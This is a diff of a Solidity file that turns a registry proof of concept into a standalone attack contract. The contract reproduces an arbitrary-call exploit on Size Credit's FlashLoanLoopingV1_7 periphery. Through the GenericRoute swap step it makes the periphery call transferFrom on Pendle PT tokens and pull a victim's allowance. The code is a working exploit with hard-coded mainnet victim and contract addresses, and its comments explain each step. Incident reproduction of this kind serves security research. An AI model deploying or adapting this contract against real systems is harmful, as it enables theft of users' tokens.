@@ -1,30 +1,23 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-import "../basetest.sol";
-import "../interface.sol";
+// Standalone, playground-safe reproduction of the Size Credit
+// FlashLoanLoopingV1_7 GenericRoute arbitrary-call exploit
+// (see evm-hack-registry/2025-08-SizeFlashLoanLooping_exp for the original
+// Foundry PoC this mirrors). No forge-std / Test dependency: the real
+// attack contract below never inherited Test either, so this is a faithful,
+// minimal standalone copy - just the `SizeFlashLoanLoopingAttack` contract
+// with a couple of local interfaces instead of the registry's giant
+// interface.sol / basetest.sol helpers.
+//
+// Attack summary: the attacker calls Size's public, unguarded
+// FlashLoanLoopingV1_7.loopPositionWithFlashLoan() with a SwapMethod.GenericRoute
+// step whose `router` is a Pendle PT token and whose `data` is
+// transferFrom(victim, attacker, amount). DexSwap._swapGenericRoute() forwards
+// that (router, data) straight into `router.call(data)` executing with the
+// periphery contract as msg.sender - so it spends the victim's PT allowance
+// that had been granted to the periphery for legitimate zap operations.
 
-// @KeyInfo - Total Lost : 533.05 USD
-// Attacker : 0x326dc2ff9045ae79ca3e395d584d3b56af1f310e
-// Attack Contract : 0x977e8f1c4e3a05be213d62428afc2891aeb9f4e3
-// Vulnerable Contract : 0x4b356dc596dd508836bd9e8fe5acad81f8cf9019
-// Attack Tx : https://etherscan.io/tx/0x63aaa5a9fc87ce419c8b1711effee34e2c726b3ee2c2d28f64b963408d6ea8d3
-//
-// @Info
-// Vulnerable Contract Code : https://etherscan.io/address/0x4b356dc596dd508836bd9e8fe5acad81f8cf9019#code
-//
-// @Analysis
-// Twitter Guy : https://t.me/defimon_alerts/1669
-//
-// Attack summary: The attacker deployed initcode that created a temporary helper and called Size's
-// FlashLoanLoopingV1_7.loopPositionWithFlashLoan() with SwapMethod.GenericRoute. The generic route target was a
-// Pendle PT token, and the route calldata was transferFrom(victim, attacker, amount).
-// Root cause: DexSwap._swapGenericRoute() accepts caller-controlled router and calldata, approves tokenIn to that
-// router, then performs router.call(data). When used through the public flashloan loop entrypoint, this arbitrary
-// external call let the Size periphery spend third-party token allowances granted to the vulnerable contract.
-
-address constant ATTACKER = 0x326dc2FF9045AE79Ca3E395D584d3b56aF1F310e;
-address constant ATTACK_CONTRACT = 0x977E8f1C4e3a05BE213D62428AFC2891Aeb9F4e3;
 address constant VICTIM = 0xaC47Ea87b634E0CAbcA5c291EaD7C1474668210d;
 address constant FLASH_LOAN_LOOPING = 0x4b356Dc596dd508836bd9e8FE5aCad81F8Cf9019;
 address constant PENDLE_PT = 0x23E60d1488525bf4685f53b3aa8E676c30321066;
@@ -32,6 +25,14 @@ address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
 
 uint256 constant PT_AMOUNT = 540_576_557_356_106_541_792;
 uint256 constant WETH_DUST = 10_000;
+
+interface IERC20Min {
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IWETHMin {
+    function deposit() external payable;
+}
 
 interface IFlashLoanLoopingV17 {
     enum SwapMethod {
@@ -72,39 +73,6 @@ interface IFlashLoanLoopingV17 {
     function loopPositionWithFlashLoan(LoopParamsV17 calldata loopParams) external;
 }
 
-contract ContractTest is BaseTestWithBalanceLog {
-    SizeFlashLoanLoopingAttack private exploit;
-
-    function setUp() public {
-        uint256 forkBlock = 23_146_022;
-        vm.createSelectFork("http://127.0.0.1:8545", forkBlock);
-        vm.label(ATTACKER, "Attacker");
-        vm.label(ATTACK_CONTRACT, "Attack Contract");
-        vm.label(VICTIM, "Victim");
-        vm.label(FLASH_LOAN_LOOPING, "Size FlashLoanLoopingV1_7");
-        vm.label(PENDLE_PT, "Pendle PT");
-        vm.label(WETH_TOKEN, "WETH");
-
-        exploit = new SizeFlashLoanLoopingAttack();
-        vm.deal(address(exploit), WETH_DUST);
-        fundingToken = PENDLE_PT;
-        attacker = address(exploit);
-    }
-
-    function testExploit() public balanceLog {
-        uint256 victimBefore = IERC20(PENDLE_PT).balanceOf(VICTIM);
-        uint256 allowanceBefore = IERC20(PENDLE_PT).allowance(VICTIM, FLASH_LOAN_LOOPING);
-
-        assertGe(victimBefore, PT_AMOUNT, "victim balance");
-        assertGe(allowanceBefore, PT_AMOUNT, "victim allowance");
-
-        exploit.run();
-
-        assertEq(IERC20(PENDLE_PT).balanceOf(address(exploit)), PT_AMOUNT, "PT profit");
-        assertEq(victimBefore - IERC20(PENDLE_PT).balanceOf(VICTIM), PT_AMOUNT, "victim loss");
-    }
-}
-
 contract SizeFlashLoanLoopingAttack {
     struct DepositParams {
         address token;
@@ -121,12 +89,19 @@ contract SizeFlashLoanLoopingAttack {
     receive() external payable {}
 
     function run() external {
-        IWETH(payable(WETH_TOKEN)).deposit{value: WETH_DUST}();
+        // Wrap a dust amount of ETH into WETH - only needed to populate the
+        // GenericRoute's `tokenIn` field; the periphery's forceApprove(WETH,
+        // router=PT, max) is a no-op since PT never spends that allowance.
+        IWETHMin(payable(WETH_TOKEN)).deposit{value: WETH_DUST}();
 
+        // The malicious "swap": router = the victim's PT token, data =
+        // transferFrom(victim, attacker, amount). Executed by the periphery
+        // via an unchecked low-level call, this pulls the victim's tokens
+        // using the allowance they granted to the periphery.
         GenericRouteParams memory route = GenericRouteParams({
             router: PENDLE_PT,
             tokenIn: WETH_TOKEN,
-            data: abi.encodeWithSelector(IERC20.transferFrom.selector, VICTIM, address(this), PT_AMOUNT)
+            data: abi.encodeWithSelector(IERC20Min.transferFrom.selector, VICTIM, address(this), PT_AMOUNT)
         });
 
         IFlashLoanLoopingV17.SwapParams[] memory swaps = new IFlashLoanLoopingV17.SwapParams[](1);
@@ -138,6 +113,10 @@ contract SizeFlashLoanLoopingAttack {
         IFlashLoanLoopingV17.SellCreditMarketParams[] memory emptySellCreditParams =
             new IFlashLoanLoopingV17.SellCreditMarketParams[](0);
 
+        // sizeMarket / collateralToken point at this contract so the
+        // post-swap Size-market multicall + leverage check are trivially
+        // satisfied by the stub functions below, and flashLoanAmountBorrowToken
+        // = 0 means there is no real Aave debt to repay.
         IFlashLoanLoopingV17.LoopParamsV17 memory loopParams = IFlashLoanLoopingV17.LoopParamsV17({
             sizeMarket: address(this),
             collateralToken: address(this),
@@ -150,6 +129,10 @@ contract SizeFlashLoanLoopingAttack {
 
         IFlashLoanLoopingV17(FLASH_LOAN_LOOPING).loopPositionWithFlashLoan(loopParams);
     }
+
+    // --- stub surface so this contract can impersonate `sizeMarket` /
+    // `collateralToken` / `borrowAToken` for the post-swap multicall the
+    // periphery runs against the (attacker-controlled) Size market ---
 
     function approve(address, uint256) external pure returns (bool) {
         return true;
